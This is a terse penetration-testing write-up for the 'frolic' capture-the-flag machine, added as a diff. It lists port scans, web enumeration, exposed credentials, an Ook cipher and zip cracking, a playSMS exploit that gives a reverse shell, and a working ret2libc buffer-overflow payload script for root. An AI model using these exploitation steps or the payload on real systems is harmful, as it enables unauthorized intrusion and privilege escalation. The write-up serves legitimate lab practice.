@@ -1,0 +1,104 @@
+OS:
+- Linux
+
+Open Ports:
+TCP:
+- 22/tcp    open     ssh
+- 139/tcp   open     netbios-ssn
+- 445/tcp   open     microsoft-ds
+        print$          Disk      Printer Drivers
+        IPC$            IPC       IPC Service (frolic server (Samba, Ubuntu))
+
+- 1880/tcp  open     vsat-control
+- 9999/tcp  open     abyss
+Server: nginx/1.10.3 (Ubuntu)
+
+- 32676/tcp filtered unknown
+- 45725/tcp filtered unknown
+
+UDP:
+- 136/udp   open|filtered profile
+- 137/udp   open|filtered netbios-ns
+- 138/udp   open|filtered netbios-dgm
+- 775/udp   open|filtered acmaint_transd
+- 1027/udp  open|filtered unknown
+- 1045/udp  open|filtered fpitp
+- 1081/udp  open|filtered pvuniwien
+- 1719/udp  open|filtered h323gatestat
+- 2967/udp  open|filtered symantec-av
+- 4045/udp  open|filtered lockd
+- 5060/udp  open|filtered sip
+- 17332/udp open|filtered unknown
+- 18258/udp open|filtered unknown
+- 19227/udp open|filtered unknown
+- 20359/udp open|filtered unknown
+- 49193/udp open|filtered unknown
+- 61550/udp open|filtered unknown
+
+- telnet to 9999 shows nginx server (ubuntu)
+- navigate to webserver in browser, confirmed webserver
+- tried changing request host to frolic.htb, no luck
+- checking common pages, robots.txt and /admin
+- /admin has login page
+- tried sql injection, did not work. got locked out
+- running gobuster
+- found /test
+Linux frolic 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:22:43 UTC 2018 i686
+
+- found /backup
+password.txt user.txt loop
+- checking subdirs:
+username: admin
+password: imnothuman
+
+- enumerating /admin
+- runs off js script
+- found creds in js script
+- signed in, got output:
+..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?.
+
+- searching for potential ciphers with the above format
+- decrypts to: Nothing here check /asdiSIAJJ0QWE9JAS
+
+- navigated to directory
+- found data: UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA 
+
+- decoding base64 
+- output to file
+- ran file on output
+- zip file
+- has password
+- use fcrackzip to crack password
+- cracked
+- got file: index.php
+- after decoding found potential password: idkwhatispass
+
+- further enumeration of subdirs
+- /playsms
+- searchsploit to find RCI
+- found exploit, upload a file with php code
+- got reverse shell
+- enumerating for priv esc
+- found setuid root binary in user dir
+- trying buffer overflow
+
+[*] Exact match at offset 52
+
+
+libc address = 0xb7e19000
+- NX enabled
+- created buffer overflow payload:
+
+#!/usr/bin/python
+import struct
+
+buf = "A" * 52
+libc = 0xb7e19000
+system = struct.pack('<I', libc + 0x0003ada0)
+exit = struct.pack('<I', libc + 0x0002e9d0)
+binsh = struct.pack('<I', libc + 0x15ba0b)
+
+payload = buf + system + exit + binsh
+print payload
+
+- root access
